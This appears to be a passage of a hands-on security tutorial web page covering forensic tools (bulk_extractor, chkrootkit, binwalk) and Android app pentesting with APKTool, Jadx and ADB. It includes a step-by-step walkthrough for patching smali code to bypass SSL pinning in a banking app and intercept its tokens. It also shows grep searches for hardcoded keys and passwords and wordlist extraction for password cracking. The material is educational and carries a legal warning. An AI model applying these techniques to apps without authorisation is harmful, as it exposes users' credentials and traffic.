# bulk_extractor automatically extracts:
# ✅ Email addresses
# ✅ URLs
# ✅ Credit card numbers
# ✅ Phone numbers  
# ✅ Social security numbers
# ✅ Bitcoin addresses
# ✅ GPS coordinates (EXIF data)
# ✅ Encryption keys
# ✅ Domain names
# ✅ Search terms

# Output files created:
ls /root/evidence/bulk_results/

# Output:
# email.txt            ← All email addresses found
# url.txt              ← All URLs found
# ccn.txt              ← Credit card numbers (!!!)
# telephone.txt        ← Phone numbers
# domain.txt           ← Domain names
# gps.txt              ← GPS coordinates from photos
# rfc822.txt           ← Email messages
# wordlist.txt         ← Unique words (useful for password cracking!)</div>

            <div class="info-box">
                <h4>Why bulk_extractor is AMAZING</h4>
                <p><strong>Speed:</strong> Scans gigabytes in minutes (doesn't care about file system)<br>
                <strong>Thoroughness:</strong> Finds data in unallocated space, compressed files, memory dumps<br>
                <strong>Automation:</strong> No configuration needed—just point and shoot!<br><br>
                <strong>Real-world use case:</strong><br>
                Investigator has 100GB disk image. Instead of manually searching, run bulk_extractor overnight. Wake up to nicely organized lists of emails, URLs, and sensitive data. Follow the leads from there!<br><br>
                It's like having a robot assistant that reads EVERYTHING and highlights the important stuff!</p>
            </div>

            <h4>bulk_extractor Advanced Options</h4>
            
            <div class="code"># -j : Number of threads (faster on multi-core systems)
bulk_extractor -j 8 -o output/ image.dd

# Uses 8 CPU cores (4x faster on quad-core!)

# -x : Enable specific scanners
bulk_extractor -x scan_accts -o output/ image.dd

# Only run the account scanner (finds username/password combos)

# -E : Enable specific extractors
bulk_extractor -E wordlist -o output/ image.dd

# Extract wordlist for password cracking

# -S : Specify scanner directory (for custom scanners)
bulk_extractor -S /usr/share/bulk_extractor/scanners -o output/ image.dd

# -q : Quiet mode (no output to screen)
bulk_extractor -q -o output/ image.dd</div>

            <h3>Part 6: chkrootkit - Rootkit Detection</h3>
            
            <p><strong>chkrootkit</strong> checks your system for rootkits—malware that hides itself and other malware from detection!</p>

            <div class="metaphor-box">
                <h4>Rootkits = The Invisible Man</h4>
                <p>Normal malware is like a burglar wearing a ski mask—suspicious but visible.<br><br>
                Rootkits are like invisible burglars:<br>
                • Hide processes from <span class="inline-code">ps</span> command<br>
                • Hide files from <span class="inline-code">ls</span> command<br>
                • Hide network connections from <span class="inline-code">netstat</span><br>
                • Replace system commands with backdoored versions<br><br>
                chkrootkit looks for signs of rootkit activity by checking if system commands have been modified and looking for known rootkit signatures!</p>
            </div>

            <div class="code"># Run chkrootkit (as root)
sudo chkrootkit

# Output:
# Checking `amd'... not found
# Checking `basename'... not infected
# Checking `biff'... not found
# Checking `chfn'... not infected
# Checking `chsh'... not infected
# Checking `cron'... not infected
# Checking `date'... not infected
# [...]
# Checking `lkm'... You have  5 process hidden for readdir command
# Checking `lkm'... Warning: Possible LKM Trojan installed  ← ALERT!
# 
# Any "Warning" or "INFECTED" is a red flag!

# Check specific tests:
sudo chkrootkit -x

# Lists all available tests

# Run specific test:
sudo chkrootkit suspicious_files

# Only checks for suspicious files

# Expert mode (detailed output):
sudo chkrootkit -x | grep INFECTED

# Shows only infected/suspicious results</div>

            <div class="warning-box">
                <h4>False Positives Are Common!</h4>
                <p>chkrootkit sometimes flags legitimate software as "suspicious". Don't panic!<br><br>
                <strong>Investigate further:</strong><br>
                • Google the specific warning<br>
                • Check file hashes against known good versions<br>
                • Use multiple rootkit scanners (rkhunter, OSSEC)<br>
                • Compare with clean system<br><br>
                Real rootkits are RARE on properly maintained systems. Most "detections" are false alarms!</p>
            </div>

            <h3>Part 7: Binwalk - Firmware Analysis Tool</h3>
            
            <p><strong>Binwalk</strong> analyzes, extracts, and reverse-engineers firmware images from routers, IoT devices, embedded systems!</p>

            <div class="code"># Analyze firmware file
binwalk firmware.bin

# Output:
# DECIMAL    HEX        DESCRIPTION
# 0          0x0        uImage header, header CRC: 0x12345678
# 64         0x40       LZMA compressed data
# 1048576    0x100000   Squashfs filesystem, little endian
# 3145728    0x300000   JFFS2 filesystem data
# 
# Shows what's INSIDE the firmware:
# - Boot loader
# - Compressed data
# - File systems
# - Embedded files

# Extract embedded files automatically:
binwalk -e firmware.bin

# Creates directory: _firmware.bin.extracted/
# Contains all extracted files and file systems!

# Extract specific signature:
binwalk --dd='.*' firmware.bin

# Extracts everything it finds</div>

            <h4>Analyzing Router Firmware Example</h4>
            
            <div class="code"># 1. Download firmware from manufacturer's website
wget http://routermaker.com/downloads/router_fw_v2.1.bin

# 2. Analyze with binwalk
binwalk router_fw_v2.1.bin

# Output shows:
# - SquashFS file system at offset 0x200000

# 3. Extract file system
binwalk -e router_fw_v2.1.bin

# 4. Navigate to extracted file system
cd _router_fw_v2.1.bin.extracted/squashfs-root/

# 5. You can now examine:
ls -la

# Output:
# bin/       ← Binaries
# etc/       ← Configuration files
# www/       ← Web interface
# lib/       ← Libraries

# 6. Look for hardcoded passwords
grep -r "password" etc/

# Output:
# etc/config.xml: <admin_password>admin123</admin_password>  ← FOUND IT!

# 7. Check web interface for vulnerabilities
cd www/
grep -r "eval" .

# Look for dangerous functions like eval(), system(), exec()</div>

            <div class="metaphor-box">
                <h4>🎉 You're Now a Digital Forensics Detective!</h4>
                <p>You've learned:<br><br>
                ✅ <strong>Autopsy:</strong> GUI forensic analysis, disk image examination<br>
                ✅ <strong>Volatility:</strong> Memory forensics, finding hidden malware<br>
                ✅ <strong>Foremost:</strong> File carving, recovering deleted files<br>
                ✅ <strong>Sleuthkit:</strong> Command-line forensics, timeline analysis<br>
                ✅ <strong>bulk_extractor:</strong> Fast evidence extraction<br>
                ✅ <strong>chkrootkit:</strong> Rootkit detection<br>
                ✅ <strong>Binwalk:</strong> Firmware analysis<br><br>
                You can now investigate hacked systems, recover deleted evidence, analyze memory dumps, and extract firmware from IoT devices. Digital forensics is like being a detective with superpowers—you can see what happened even when attackers tried to cover their tracks!<br><br>
                <strong>Practice challenges:</strong><br>
                • Download practice disk images from forensic CTFs<br>
                • Analyze your own system's memory<br>
                • Extract firmware from old routers<br>
                • Create timeline of your own file activity<br><br>
                The evidence is ALWAYS there if you know where to look! 🔍</p>
            </div>
        </section>

        <!-- SECTION 2: Mobile Security & App Pentesting -->
        <section id="mobile-security" class="section">
            <h2 class="section-title">Mobile Security & App Pentesting</h2>
            <p class="section-intro">Welcome to the world where your phone is no longer just a communication device—it's a treasure chest of secrets, vulnerabilities, and attack vectors! Every app you download, every permission you grant, every API call made in the background... it's all code that can be analyzed, reversed, and potentially exploited. In this section, we're diving deep into the art and science of mobile application penetration testing. Whether you're hunting for hardcoded API keys, bypassing SSL pinning, or hooking into running processes to manipulate app behavior in real-time, this is your complete guide to mobile security from a hacker's perspective.</p>

            <div class="metaphor-box">
                <h4>💡 Think of Mobile Apps Like Locked Boxes</h4>
                <p>Imagine every app on your phone is a locked treasure box. Regular users see only the outside—the shiny interface, the buttons, the screens. But as a pentester, you have tools to crack open that box and see what's inside: the actual code, the hidden API endpoints, the secrets developers thought were safe. APKTool is your crowbar, Jadx is your magnifying glass, and Frida is your master key that works while the box is still locked!</p>
            </div>

            <h3>What is Mobile Penetration Testing?</h3>
            <p>Mobile penetration testing is the process of systematically analyzing mobile applications (primarily Android and iOS) to identify security vulnerabilities before malicious actors can exploit them. Unlike traditional web pentesting where you're attacking servers and websites, mobile pentesting focuses on the app itself—the code running on millions of devices.</p>

            <div class="info-box">
                <h4>Why Mobile Security Matters</h4>
                <p><strong>5+ billion smartphones worldwide.</strong> Each one runs dozens of apps. Banking apps, social media, health trackers, password managers—all storing sensitive data. A single vulnerability in a popular app can expose millions of users to:</p>
                <ul style="margin-top: 1rem; color: var(--text2);">
                    <li><strong>Data theft:</strong> Credentials, tokens, personal information</li>
                    <li><strong>Financial fraud:</strong> Bypassing payment verification, unauthorized transactions</li>
                    <li><strong>Privacy violations:</strong> Location tracking, microphone/camera access</li>
                    <li><strong>Malware injection:</strong> Modifying apps to include malicious code</li>
                </ul>
            </div>

            <h4>The Mobile Pentesting Process (Overview)</h4>
            <p>Before we dive into each tool, here's the big picture of how mobile pentesting works:</p>

            <div class="card-grid">
                <div class="card">
                    <h4>1. Acquisition</h4>
                    <p>Download the target APK (Android Package) or IPA (iOS App Store Package) from the app store, device, or third-party sources.</p>
                </div>
                <div class="card">
                    <h4>2. Static Analysis</h4>
                    <p>Decompile the app to examine its code, resources, and manifest files without running it. Look for hardcoded secrets, insecure configurations, and vulnerable code patterns.</p>
                </div>
                <div class="card">
                    <h4>3. Dynamic Analysis</h4>
                    <p>Run the app in a controlled environment while intercepting network traffic, monitoring file system changes, and hooking into functions to observe runtime behavior.</p>
                </div>
                <div class="card">
                    <h4>4. Vulnerability Assessment</h4>
                    <p>Identify security issues like insecure data storage, weak crypto, exposed endpoints, SSL pinning that can be bypassed, and insufficient authentication.</p>
                </div>
                <div class="card">
                    <h4>5. Exploitation</h4>
                    <p>Prove the impact by exploiting vulnerabilities—bypass authentication, extract sensitive data, modify app behavior, or escalate privileges.</p>
                </div>
                <div class="card">
                    <h4>6. Reporting</h4>
                    <p>Document findings with severity ratings, proof-of-concept code, impact assessment, and remediation recommendations.</p>
                </div>
            </div>

            <div class="warning-box">
                <h4>⚠️ Legal & Ethical Boundaries</h4>
                <p><strong>CRITICAL:</strong> Only test apps you have explicit permission to test. This means:</p>
                <ul style="margin-top: 1rem;">
                    <li>Apps you developed yourself</li>
                    <li>Apps where you have written authorization from the owner/company</li>
                    <li>Apps specifically created for training (like DVIA, InsecureBankv2, etc.)</li>
                </ul>
                <p style="margin-top: 1rem;"><strong>Reverse engineering commercial apps without permission is often illegal</strong> under laws like the DMCA (USA), Computer Misuse Act (UK), and similar legislation worldwide. Bug bounty programs are your legal avenue for testing real-world apps!</p>
            </div>

            <h3>Understanding Android Architecture</h3>
            <p>Before you can hack Android apps, you need to understand what you're hacking. Let's break down Android's architecture from a pentester's perspective:</p>

            <h4>The APK Structure</h4>
            <p>An APK (Android Package Kit) is essentially a ZIP archive with a specific structure. When you decompile an APK, you'll find:</p>

            <div class="code">
my-app.apk/
│
├── AndroidManifest.xml          ← App permissions, components, metadata
├── classes.dex                  ← Compiled Dalvik bytecode (the actual code)
├── classes2.dex                 ← Additional DEX files (large apps)
├── resources.arsc               ← Compiled resources (strings, layouts, etc.)
├── META-INF/                    ← App signatures and certificates
│   ├── MANIFEST.MF
│   ├── CERT.SF
│   └── CERT.RSA
├── lib/                         ← Native libraries (.so files)
│   ├── armeabi-v7a/            ← ARM 32-bit libraries
│   ├── arm64-v8a/              ← ARM 64-bit libraries
│   ├── x86/                    ← x86 32-bit libraries
│   └── x86_64/                 ← x86 64-bit libraries
├── assets/                      ← Raw asset files (databases, configs, etc.)
├── res/                         ← Resources (images, layouts, strings)
│   ├── drawable/               ← Images and icons
│   ├── layout/                 ← XML UI layouts
│   └── values/                 ← Strings, colors, dimensions
└── kotlin/                      ← Kotlin metadata (if app uses Kotlin)
</div>

            <div class="info-box">
                <h4>Why This Structure Matters for Pentesting</h4>
                <p>Every folder and file has security implications:</p>
                <ul style="margin-top: 1rem; color: var(--text2);">
                    <li><strong>AndroidManifest.xml:</strong> Lists all permissions (camera, location, contacts). Over-privileged apps = red flag!</li>
                    <li><strong>classes.dex:</strong> The actual code. This is what you decompile to find vulnerabilities.</li>
                    <li><strong>lib/:</strong> Native libraries can contain hardcoded secrets or backdoors.</li>
                    <li><strong>assets/:</strong> Often contains databases, config files, API keys in plaintext.</li>
                    <li><strong>res/values/strings.xml:</strong> Developers sometimes hide API keys here thinking "it's just a string file."</li>
                </ul>
            </div>

            <h3>Part 1: APKTool - The Swiss Army Knife of APK Analysis</h3>

            <p><strong>APKTool</strong> is THE tool for decompiling and recompiling Android APK files. It converts the binary APK into human-readable format (Smali code and XML files), lets you modify it, then repackages it back into an APK. This is essential for understanding how apps work and testing modifications.</p>

            <div class="metaphor-box">
                <h4>💡 APKTool is Like Google Translate for Apps</h4>
                <p>Imagine you receive a book written in an alien language (the compiled APK). You can't read it directly. APKTool is your translator—it converts the alien language into something you can understand (Smali code, XML files). You can then edit the translation, and APKTool will convert it back into the alien language so the app can run with your changes!</p>
            </div>

            <h4>Installing APKTool</h4>

            <div class="code"># APKTool comes pre-installed on Kali, but here's how to update it:
wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.3.jar
mv apktool_2.9.3.jar apktool.jar
chmod +x apktool apktool.jar
sudo mv apktool apktool.jar /usr/local/bin/

# Verify installation:
apktool --version

# Output:
# 2.9.3</div>

            <h4>Decompiling an APK with APKTool</h4>

            <div class="code"># Basic syntax:
# apktool d [flags] <apk_file> [output_directory]
#
# d = decode (decompile)

# Example: Decompile an APK
apktool d myapp.apk

# Output:
# I: Using Apktool 2.9.3
# I: Loading resource table...
# I: Decoding AndroidManifest.xml with resources...
# I: Loading resource table from file: /home/user/.local/share/apktool/framework/1.apk
# I: Regular manifest package...
# I: Decoding file-resources...
# I: Decoding values */* XMLs...
# I: Baksmaling classes.dex...
# I: Baksmaling classes2.dex...
# I: Copying assets and libs...
# I: Copying unknown files...
# I: Copying original files...
#
# Creates folder: myapp/

# Navigate into decompiled app:
cd myapp/
ls -la

# Output:
# AndroidManifest.xml    ← Now human-readable XML!
# apktool.yml            ← APKTool metadata
# original/              ← Original META-INF (signature)
# res/                   ← All resources (images, layouts, strings)
# smali/                 ← Decompiled code in Smali format
# lib/                   ← Native libraries
# assets/                ← Asset files</div>

            <h4>APKTool Flags Explained (Every Single One!)</h4>

            <div class="code"># -d, --decode
# Decompile the APK (this is the default action)
apktool d myapp.apk

# -f, --force
# Force delete destination directory if it exists already
apktool d -f myapp.apk

# Without -f, you'd get error: "Destination directory exists, use -f to force"
# With -f, APKTool deletes the old folder and creates a fresh decompile

# -o, --output <dir>
# Specify custom output directory name
apktool d myapp.apk -o my_custom_folder

# Creates "my_custom_folder" instead of default "myapp"

# -s, --no-src
# Do NOT decompile source code (skip classes.dex → smali conversion)
# Only extract resources (AndroidManifest, res/, assets/)
apktool d -s myapp.apk

# Useful when you only care about resources, not code
# Much faster! (No need to decompile thousands of smali files)

# -r, --no-res
# Do NOT decode resources (skip res/ folder)
# Only decompile code (classes.dex → smali)
apktool d -r myapp.apk

# Opposite of -s. Use when you only need code, not images/layouts

# --no-assets
# Do NOT decode assets
# Skip the assets/ folder extraction
apktool d --no-assets myapp.apk

# --only-main-classes
# Only decompile main classes.dex (skip classes2.dex, classes3.dex, etc.)
apktool d --only-main-classes myapp.apk

# Large apps split code into multiple DEX files
# This flag saves time by only processing the first one

# --frame-path <dir>
# Specify custom framework directory
# (Advanced: For apps that depend on specific Android framework versions)
apktool d --frame-path /path/to/frameworks myapp.apk

# -p, --frame-tag <tag>
# Tag frameworks using a specific name
apktool d -p samsung_framework myapp.apk

# Useful for Samsung/Xiaomi/etc. apps with custom frameworks

# -t, --tag <tag>
# Use specific framework files with this tag
apktool d -t samsung myapp.apk

# --api <level>
# Set Android API level manually
apktool d --api 30 myapp.apk

# Forces APKTool to treat the app as Android 11 (API 30)

# -m, --match-original
# Keep some files in their original form (don't decode them)
apktool d -m myapp.apk

# Useful for preserving signature-related files</div>

            <h4>Recompiling (Building) an APK</h4>

            <div class="code"># After modifying the decompiled app, rebuild it:
# apktool b [flags] <folder_name>
#
# b = build (recompile)

# Basic build:
apktool b myapp

# Output:
# I: Using Apktool 2.9.3
# I: Checking whether sources has changed...
# I: Smaling smali folder into classes.dex...
# I: Smaling smali_classes2 folder into classes2.dex...
# I: Building resources...
# I: Copying libs... (/lib)
# I: Copying libs... (/kotlin)
# I: Building apk file...
# I: Copying unknown files/dir...
# I: Built apk into: myapp/dist/myapp.apk
#
# The rebuilt APK is in: myapp/dist/myapp.apk

# Build flags:

# -f, --force
# Force rebuild even if no changes detected
apktool b -f myapp

# -o, --output <file>
# Specify output APK filename
apktool b myapp -o modified_app.apk

# -c, --copy-original
# Copy original files (like original signature)
apktool b -c myapp

# -p, --frame-path <dir>
# Use custom framework path (must match what you used during decode)
apktool b -p samsung_framework myapp

# -d, --debug
# Build in debug mode (easier to debug with Android Studio)
apktool b -d myapp

# -n, --net-sec-conf
# Do not include default network security config
apktool b -n myapp

# Useful if you're adding custom network config

# -a, --aapt <path>
# Use custom aapt binary (Android Asset Packaging Tool)
apktool b -a /path/to/custom/aapt myapp

# --use-aapt2
# Use aapt2 instead of aapt (newer, faster)
apktool b --use-aapt2 myapp</div>

            <div class="warning-box">
                <h4>⚠️ Rebuilt APKs Need to Be Signed!</h4>
                <p>After rebuilding an APK, Android will REFUSE to install it because it's no longer signed by the original developer. You must sign it with your own key:<br><br>
                <strong>Step 1: Generate a keystore (one-time setup)</strong></p>
                <div class="code" style="margin-top: 1rem;">keytool -genkey -v -keystore my-release-key.keystore -alias my_alias -keyalg RSA -keysize 2048 -validity 10000

# Answer the prompts:
# Enter keystore password: [your_password]
# Re-enter password: [your_password]
# What is your first and last name? [Your Name]
# [... more questions ...]

# This creates: my-release-key.keystore</div>
                <p style="margin-top: 1rem;"><strong>Step 2: Sign the rebuilt APK</strong></p>
                <div class="code" style="margin-top: 1rem;">jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore my-release-key.keystore myapp/dist/myapp.apk my_alias

# Enter Passphrase for keystore: [your_password]
# Output:
#   signing: AndroidManifest.xml
#   signing: classes.dex
#   signing: resources.arsc
#   [... more files ...]
# jar signed.</div>
                <p style="margin-top: 1rem;"><strong>Step 3: Verify signature</strong></p>
                <div class="code" style="margin-top: 1rem;">jarsigner -verify -verbose -certs myapp/dist/myapp.apk

# Output:
# jar verified.</div>
                <p style="margin-top: 1rem;">Now your APK can be installed on Android devices!</p>
            </div>

            <h4>Real-World APKTool Workflow: Bypassing Certificate Pinning</h4>

            <p>Let's see APKTool in action with a common pentest scenario: bypassing SSL certificate pinning to intercept HTTPS traffic.</p>

            <div class="code"># Step 1: Decompile the target app
apktool d banking_app.apk

# Step 2: Navigate to decompiled code
cd banking_app/smali/com/bankingapp/network/

# Step 3: Find the certificate pinning code
# Look for files with "SSL", "Certificate", "Pinning" in names
grep -r "SSL" .
grep -r "Certificate" .

# Step 4: Open the relevant smali file
nano SSLPinningManager.smali

# You'll see Smali code (looks like assembly language):
# 
# .method public checkServerTrusted([Ljava/security/cert/X509Certificate;Ljava/lang/String;)V
#     .locals 2
#     const/4 v0, 0x0
#     invoke-static {}, Lcom/bankingapp/security/CertValidator;->verify()Z
#     move-result v0
#     if-nez v0, :cond_0
#     new-instance v1, Ljava/security/cert/CertificateException;
#     const-string v0, "Certificate validation failed"
#     invoke-direct {v1, v0}, Ljava/security/cert/CertificateException;-><init>(Ljava/lang/String;)V
#     throw v1
#     :cond_0
#     return-void
# .end method

# Step 5: Modify the code to always return (bypass check)
# Change:
#     invoke-static {}, Lcom/bankingapp/security/CertValidator;->verify()Z
#     move-result v0
#     if-nez v0, :cond_0
#     [throw exception code]
# 
# To:
#     return-void

# This makes the function immediately return without checking certificates!

# Step 6: Save and rebuild
apktool b banking_app

# Step 7: Sign the modified APK
jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore ~/my-key.keystore banking_app/dist/banking_app.apk my_alias

# Step 8: Install on device
adb install banking_app/dist/banking_app.apk

# Step 9: Set up Burp Suite proxy on your device
# Now all HTTPS traffic from the app goes through Burp, and certificate errors are ignored!

# Step 10: Intercept API calls
# Open the banking app and watch Burp Suite capture all requests
# You can now see authentication tokens, API endpoints, sensitive data!</div>

            <div class="metaphor-box">
                <h4>💡 What Did We Just Do?</h4>
                <p>Think of SSL pinning like a bouncer checking IDs at a club. The app only trusts specific certificates (IDs), and rejects all others—even your Burp Suite proxy certificate.<br><br>
                By modifying the Smali code, we told the bouncer "just let everyone in without checking IDs." Now we can intercept all the HTTPS traffic between the app and the server!<br><br>
                This is a CRITICAL technique for mobile pentesting because modern apps use SSL to hide their API calls. Without bypassing SSL pinning, you can't see what data the app is sending!</p>
            </div>

            <h4>Finding Hardcoded Secrets with APKTool</h4>

            <div class="code"># After decompiling with APKTool:
cd myapp/

# Search for API keys:
grep -r "api" . | grep -i "key"
grep -r "apikey" .
grep -r "api_key" .

# Output examples:
# ./res/values/strings.xml:<string name="google_api_key">AIzaSyB1234567890_API_KEY_HERE</string>
# ./smali/com/example/api/Config.smali:    const-string v0, "sk_live_51234567890"

# Search for passwords:
grep -r "password" . | grep -v ".png" | grep -v ".jpg"
# (excluding image files)

# Output:
# ./res/values/strings.xml:<string name="default_password">admin123</string>
# ./smali/com/example/auth/Login.smali:    const-string v1, "hardcoded_password"

# Search for database credentials:
grep -r "jdbc" .
grep -r "mysql" .
grep -r "postgres" .

# Search for AWS/cloud keys:
grep -r "AKIA" .     # AWS Access Key format
grep -r "aws" .

# Search for tokens:
grep -r "token" . | grep -v ".png"
grep -r "bearer" .
grep -r "jwt" .

# Check AndroidManifest.xml for suspicious permissions:
cat AndroidManifest.xml | grep "permission"

# Output:
# <uses-permission android:name="android.permission.INTERNET"/>
# <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
# <uses-permission android:name="android.permission.READ_CONTACTS"/>  ← Why does this app need contacts?
# <uses-permission android:name="android.permission.CAMERA"/>
# <uses-permission android:name="android.permission.RECORD_AUDIO"/>  ← Spyware?</div>

            <div class="info-box">
                <h4>Smali vs Java: What's the Difference?</h4>
                <p><strong>Java:</strong> High-level language developers write in<br>
                <strong>DEX:</strong> Compiled format Android uses (Dalvik Executable)<br>
                <strong>Smali:</strong> Human-readable representation of DEX bytecode<br><br>
                Think of it like this:<br>
                • <strong>Java:</strong> "if (password == 'admin') { login(); }"<br>
                • <strong>Smali:</strong> "const-string v0, 'admin' / if-eq v0, v1, :cond_0 / invoke-virtual {p0}, login"<br><br>
                Smali is harder to read but still understandable with practice. APKTool outputs Smali because you can't directly get Java from DEX. For Java-like code, use <strong>Jadx</strong> (next tool!)</p>
            </div>

            <h3>Part 2: Jadx - Java Decompiler for Android</h3>

            <p><strong>Jadx</strong> takes APK files and decompiles them directly into Java code—much easier to read than Smali! It has both GUI and command-line modes.</p>

            <div class="code"># Install Jadx (comes with Kali, but here's manual install):
wget https://github.com/skylot/jadx/releases/download/v1.4.7/jadx-1.4.7.zip
unzip jadx-1.4.7.zip -d jadx
cd jadx/bin
./jadx-gui   # Launch GUI version

# Or use command-line:
./jadx myapp.apk</div>

            <h4>Jadx GUI - The Easy Way</h4>

            <div class="code"># Launch Jadx GUI:
jadx-gui

# In the GUI:
# 1. File → Open File → Select myapp.apk
# 2. Wait for decompilation (can take 1-5 minutes for large apps)
# 3. Browse the code in the left panel
# 4. Click any class to see Java code!

# Features:
# ✅ Full-text search (Ctrl+Shift+F)
# ✅ Find usages of any method/class
# ✅ Jump to declaration (Ctrl+B)
# ✅ Export to Gradle project
# ✅ Deobfuscation (unscramble obfuscated code)</div>

            <div class="metaphor-box">
                <h4>💡 APKTool vs Jadx: When to Use What?</h4>
                <p><strong>Use APKTool when:</strong><br>
                • You need to MODIFY and RECOMPILE the app<br>
                • You want to see the exact Smali code (closer to actual bytecode)<br>
                • You need to edit resources (strings.xml, layouts)<br><br>
                <strong>Use Jadx when:</strong><br>
                • You just want to READ the code (not modify)<br>
                • You prefer Java over Smali (much more readable!)<br>
                • You're searching for specific vulnerabilities in logic<br><br>
                <strong>Pro tip:</strong> Use BOTH! Decompile with Jadx to understand the code, then use APKTool to make modifications!</p>
            </div>

            <h4>Jadx Command-Line Flags (Complete Reference)</h4>

            <div class="code"># Basic decompile:
jadx myapp.apk

# Creates folder: myapp/
# Inside: sources/ (Java code) and resources/ (XML, images, etc.)

# -d, --output-dir <dir>
# Specify output directory
jadx -d output_folder myapp.apk

# -j, --threads-count <number>
# Number of threads for decompilation (faster!)
jadx -j 8 myapp.apk

# Uses 8 CPU cores (default is 4)
# Large apps benefit hugely from this!

# --no-res
# Do NOT decompile resources (skip resources folder)
jadx --no-res myapp.apk

# Faster if you only care about code

# --no-src
# Do NOT decompile source code (only extract resources)
jadx --no-src myapp.apk

# Opposite of --no-res

# --show-bad-code
# Include code that failed to decompile (usually obfuscated junk)
jadx --show-bad-code myapp.apk

# Normally Jadx skips methods it can't decompile
# This flag shows them anyway (as comments)

# --no-imports
# Don't add import statements (shows full class names everywhere)
jadx --no-imports myapp.apk

# Makes code longer but more explicit

# --no-debug-info
# Strip debug information
jadx --no-debug-info myapp.apk

# --add-debug-lines
# Add comments with original line numbers
jadx --add-debug-lines myapp.apk

# --no-inline-anonymous
# Don't inline anonymous classes
jadx --no-inline-anonymous myapp.apk

# --no-replace-consts
# Don't replace constants with actual values
jadx --no-replace-consts myapp.apk

# Example: Shows "0x7F0A0001" instead of "R.id.button"

# --escape-unicode
# Escape non-ASCII characters in strings
jadx --escape-unicode myapp.apk

# --deobf
# Enable deobfuscation (unscramble obfuscated names)
jadx --deobf myapp.apk

# Changes:
#   class a { void b() { ... } }
# To:
#   class MainActivity { void onCreate() { ... } }

# --deobf-min <length>
# Minimum length for deobfuscated names (default: 3)
jadx --deobf --deobf-min 4 myapp.apk

# --deobf-max <length>
# Maximum length for deobfuscated names (default: 64)
jadx --deobf --deobf-max 20 myapp.apk

# --deobf-cfg-file <file>
# Custom deobfuscation map
jadx --deobf --deobf-cfg-file mapping.txt myapp.apk

# --deobf-use-sourcename
# Use source file names for class naming
jadx --deobf --deobf-use-sourcename myapp.apk

# --deobf-parse-kotlin-metadata
# Use Kotlin metadata for deobfuscation
jadx --deobf --deobf-parse-kotlin-metadata myapp.apk

# --export-gradle
# Export as Android Studio project with gradle
jadx --export-gradle myapp.apk

# Creates buildable Android Studio project!

# -v, --verbose
# Verbose output (show progress details)
jadx -v myapp.apk

# --version
# Show Jadx version
jadx --version</div>

            <h4>Finding Security Issues with Jadx</h4>

            <div class="code"># After decompiling with Jadx:
cd myapp/sources/com/example/app/

# 1. Find hardcoded credentials:
grep -r "password" . | grep -v ".png"

# Output:
# ./auth/LoginActivity.java:    private static final String PASSWORD = "admin123";

# Open the file:
cat auth/LoginActivity.java

# You see:
# public class LoginActivity {
#     private static final String DEFAULT_USER = "admin";
#     private static final String DEFAULT_PASSWORD = "admin123";
#     
#     private void doLogin(String username, String password) {
#         if (username.equals(DEFAULT_USER) && password.equals(DEFAULT_PASSWORD)) {
#             // Hardcoded backdoor!
#         }
#     }
# }

# 2. Find SQL injection vulnerabilities:
grep -r "execSQL" .
grep -r "rawQuery" .
grep -r "query(" .

# Look for string concatenation instead of prepared statements:
# ❌ BAD (vulnerable):
# String query = "SELECT * FROM users WHERE username='" + username + "'";
# db.rawQuery(query, null);
# 
# ✅ GOOD (safe):
# String query = "SELECT * FROM users WHERE username=?";
# db.rawQuery(query, new String[]{username});

# 3. Find insecure file storage:
grep -r "openFileOutput" .
grep -r "getExternalStorageDirectory" .
grep -r "MODE_WORLD_READABLE" .

# MODE_WORLD_READABLE = any app can read this file! (deprecated but still found)

# 4. Find insecure crypto:
grep -r "DES" .     # Weak encryption
grep -r "MD5" .     # Weak hashing
grep -r "SHA1" .    # Weak hashing

# Look for:
# Cipher cipher = Cipher.getInstance("DES");  ← BAD! Use AES!
# MessageDigest md = MessageDigest.getInstance("MD5");  ← BAD! Use SHA-256!

# 5. Find API endpoints:
grep -r "http://" .
grep -r "https://" .
grep -r "api" . | grep -i "url"

# Output:
# ./network/ApiClient.java:    private static final String BASE_URL = "https://api.example.com";
# ./network/ApiClient.java:    private static final String AUTH_ENDPOINT = "/auth/login";

# Now you know the API structure!

# 6. Find debugging code that shouldn't be in production:
grep -r "Log.d" .
grep -r "Log.v" .
grep -r "System.out.println" .

# Example:
# ./auth/LoginActivity.java:    Log.d("AUTH", "Password: " + password);
# ↑ Logs user passwords! Major security issue!

# 7. Find WebView vulnerabilities:
grep -r "WebView" .
grep -r "setJavaScriptEnabled" .
grep -r "addJavascriptInterface" .

# Look for:
# webView.setJavaScriptEnabled(true);  ← Needed for web apps
# webView.addJavascriptInterface(new JsInterface(), "Android");
# ↑ Allows JavaScript to call Java methods! Can be exploited!

# 8. Find intent vulnerabilities (exported components):
cd ../../    # Back to root
grep -r "exported=\"true\"" .

# Shows which components are accessible by other apps
# Could be exploited for privilege escalation!</div>

            <div class="info-box">
                <h4>Common Vulnerabilities Found via Jadx</h4>
                <p><strong>Hardcoded Secrets:</strong> API keys, passwords, tokens directly in code<br>
                <strong>Insecure Crypto:</strong> DES, MD5, SHA1, hardcoded encryption keys<br>
                <strong>SQL Injection:</strong> String concatenation in database queries<br>
                <strong>Path Traversal:</strong> User input directly in file paths<br>
                <strong>Insecure Data Storage:</strong> Sensitive data in SharedPreferences, external storage<br>
                <strong>Weak Authentication:</strong> Client-side validation, hardcoded credentials<br>
                <strong>Information Disclosure:</strong> Logging sensitive data, debug code in production<br>
                <strong>WebView Exploits:</strong> JavaScript interfaces, allowFileAccess enabled<br><br>
                <strong>Pro tip:</strong> Always check ProGuard/R8 obfuscation. If code looks scrambled (class names like 'a', 'b', 'c'), use --deobf flag!</p>
            </div>

            <h3>Part 3: ADB - Android Debug Bridge Master Class</h3>

            <p><strong>ADB (Android Debug Bridge)</strong> is your command-line interface to Android devices. It lets you install apps, access the shell, pull/push files, view logs, and much more. Essential for dynamic analysis!</p>

            <div class="code"># Check if ADB is installed:
adb version

# Output:
# Android Debug Bridge version 1.0.41
# Version 34.0.5-10900879

# Start ADB server (run once after boot):
adb start-server

# Output:
# * daemon not running; starting now at tcp:5037
# * daemon started successfully

# List connected devices:
adb devices

# Output:
# List of devices attached
# emulator-5554    device
# R58M12345678     device
# 
# Shows emulators and physical devices
# "device" means ready for commands
# If you see "unauthorized", accept the popup on your phone!</div>

